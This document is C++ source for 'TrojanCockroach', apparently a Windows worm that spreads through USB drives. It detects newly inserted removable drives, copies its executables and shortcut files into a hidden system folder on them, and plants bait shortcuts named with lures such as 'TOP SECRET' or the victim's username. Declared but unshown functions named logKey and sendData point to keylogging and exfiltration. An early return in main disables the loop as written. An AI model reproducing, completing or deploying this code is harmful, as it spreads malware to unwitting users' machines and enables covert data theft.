
#include <windows.h>
#include <time.h>
#include <string>
#include <fstream>

using namespace std;


#define FOLDER_NAME "trojanCockroach"
#define RUN_FILE_NAME "TrojanCockroach.exe"
#define RUN_LINK_NAME "TrojanCockroach.lnk"
#define INFECT_FILE_NAME "Infect.exe"
#define INFECT_LINK_NAME "Infect.lnk"

string allDrives;
int age=0;

int get_setAge();
bool checkRecordSize();
void sendData();
void logUserTime();
void logKey();
char getRemovableDisk();
void infectDrive(char driveLetter);
char* getRandomName();


main(){
    FreeConsole(); ///hide window

    char driveLetter = getRemovableDisk(); ///initial search for all disks
    return; // :)
    while(1){

        ////////////****INFECT****////////////
        driveLetter = getRemovableDisk();
        if(driveLetter!='0'){
            infectDrive(driveLetter);
        }
    }
    
}

/**
 * Returns newly inserted disk- pen-drive.
**/
char getRemovableDisk(){
    char drive='0';

    char szLogicalDrives[MAX_PATH];
    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);
    string currentDrives="";

    for(int i=0; i<dwResult; i++){
        if(szLogicalDrives[i]>64 && szLogicalDrives[i]< 90){
            currentDrives.append(1, szLogicalDrives[i]);

            if(allDrives.find(szLogicalDrives[i]) > 100){
                drive = szLogicalDrives[i];
            }
        }
    }

    allDrives = currentDrives;

    return drive;
}

/**
 * Copy the virus to pen-drive.
**/
void infectDrive(char driveLetter){
    char folderPath[10] = {driveLetter};
    strcat(folderPath, ":\\");
    strcat(folderPath, FOLDER_NAME);

    if(CreateDirectory(folderPath ,NULL)){
        SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN);

        char run[100]={""};
        strcat(run, folderPath);
        strcat(run, "\\");
        strcat(run, RUN_FILE_NAME);
        CopyFile(RUN_FILE_NAME, run, 0);

        char infect[100]={""};
        strcat(infect, folderPath);
        strcat(infect, "\\");
        strcat(infect, INFECT_FILE_NAME);
        CopyFile(INFECT_FILE_NAME, infect, 0);

        char runlnk[100]={""};
        strcat(runlnk, folderPath);
        strcat(runlnk, "\\");
        strcat(runlnk, RUN_LINK_NAME);
        CopyFile(RUN_LINK_NAME, runlnk, 0);

        char infectlnk[100]={""};
        strcat(infectlnk, folderPath);
        strcat(infectlnk, "\\");
        strcat(infectlnk, INFECT_LINK_NAME);
        CopyFile(INFECT_LINK_NAME, infectlnk, 0);

        char hideCommand[100] = {""};
        strcat(hideCommand, "attrib +s +h +r ");
        strcat(hideCommand, folderPath);
        WinExec(hideCommand, SW_HIDE);
    }else{
        srand(time(0));
        int random = rand();

        if(random%2==0 || random%3==0 || random%7==0){
            return ;
        }
    }

    char infectlnkauto[100] = {driveLetter};
    char* randomName = getRandomName();
    strcat(infectlnkauto, randomName);
    CopyFile(INFECT_LINK_NAME, infectlnkauto, 0);
}

/**
 * Returns a random name for the link file.
**/
char* getRandomName(){
    char randomName[40];

    srand(time(0));
    int random = rand();

    if(random%8 == 0){
        strcpy(randomName, ":\\DO NOT CLICK!.lnk");
    }else if(random%4 == 0){

        char username[20];
        unsigned long username_len = 20;
        GetUserName(username, &username_len);

        random = rand();
        if(random%8 == 0){
            strcpy(randomName, ":\\Boss ");
            strcat(randomName, username);
            strcat(randomName, ".lnk");
        }else if(random%4 == 0){
            strcpy(randomName, ":\\");
            strcat(randomName, username);
            strcat(randomName, " is the best.lnk");
        }else if(random%2 == 0){
            strcpy(randomName, ":\\Hello ");
            strcat(randomName, username);
            strcat(randomName, "! good morning.lnk");
        }else{
            strcpy(randomName, ":\\");
            strcat(randomName, username);
            strcat(randomName, "! please help me.lnk");
        }
    }else if(random%2 == 0){
        strcpy(randomName, ":\\I will kill you ! ! !.lnk");
    }else if(random%3 == 0){
        strcpy(randomName, ":\\2+2=5.lnk");
    }else{
        strcpy(randomName, ":\\TOP SECRET.lnk");
    }

    return randomName;
}
